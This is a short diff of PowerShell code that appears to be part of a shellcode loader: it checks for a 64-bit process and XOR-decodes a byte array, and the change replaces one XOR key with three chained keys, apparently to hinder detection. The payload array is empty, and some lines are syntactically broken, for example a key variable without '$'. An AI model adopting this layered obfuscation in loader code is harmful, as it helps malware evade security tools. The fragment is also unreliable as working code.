@@ -24,7 +24,7 @@ If ([IntPtr]::size -eq 0x8) {
 
     [Byte[]]$var_code = 
     for ($x = 0; $x -lt $var_code.Count; $x++) {
-        $var_code[$x] = $var_code[$x] -bxor key 
+        $var_code[$x] = $var_code[$x] -bxor key1 -bxor key2 -bxor key3
         [char[]][int[]]$char = $var_code
     }
 
